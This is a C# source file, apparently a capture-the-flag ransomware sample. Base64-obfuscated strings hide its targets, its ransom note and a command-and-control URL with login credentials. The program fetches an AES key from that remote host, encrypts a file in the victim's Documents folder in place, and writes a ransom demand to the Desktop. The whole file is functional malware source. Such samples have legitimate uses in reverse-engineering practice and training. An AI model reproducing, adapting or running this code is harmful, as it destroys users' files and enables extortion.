using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Net;

class Program
{
    private static string ks;
    private static byte[] k;

    private static string ivs;
    private static byte[] iv;

    public static void Main(string[] args)
    {
        try
        {
            GetKIV();

            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + De("XHNlY3JldF92aWRlby5tcDQ=");
            string notePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + De("XHJhbnNvbV9ub3RlLnR4dA==");

            if (File.Exists(path))
            {
                byte[] data = Encrypt(File.ReadAllBytes(path), k, iv);
                File.WriteAllBytes(path, data);
                File.WriteAllText(notePath, De("WW91ciBmaWxlIGhhcyBiZWVuIGVuY3J5cHRlZC4gUGF5IDEzMzcgYmVlcnMgdG8gdGhlIEdyZUhhY2sgc3RhZmYgdG8gZGVjcnlwdCBpdCAh"));
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }

    public static void GetKIV()
    {
        string url = De("aHR0cHM6Ly9pLXdpbGwtcHduLXlvdXIuaG9zdC80YWY1ZGEyZTllZjVlZmQzNTIwYzlhOWY0NjNkYmRlZQ==");
        string user = De("YzJfbTRzdDNy");
        string pass = De("MjlhMzY3NWJjODdhZDMyODUyZjc5MzU3NDFmOGU5OGNlZTU0N2M2NQ==");
        string creds = Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + pass));

        using (WebClient wc = new WebClient())
        {
            wc.Headers[HttpRequestHeader.Authorization] = "Basic " + creds;
            var json = wc.DownloadString(url);
            ks = Extract(json, "key");
            ivs = Extract(json, "iv");
        }

        k = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(ks));
        iv = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(ivs));
    }

    private static string Extract(string json, string key)
    {
        string marker = "\"" + key + "\":\"";
        int start = json.IndexOf(marker) + marker.Length;
        int end = json.IndexOf("\"", start);
        return json.Substring(start, end - start);
    }

    public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform enc = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }
    }

    private static string De(string input)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
    }
}
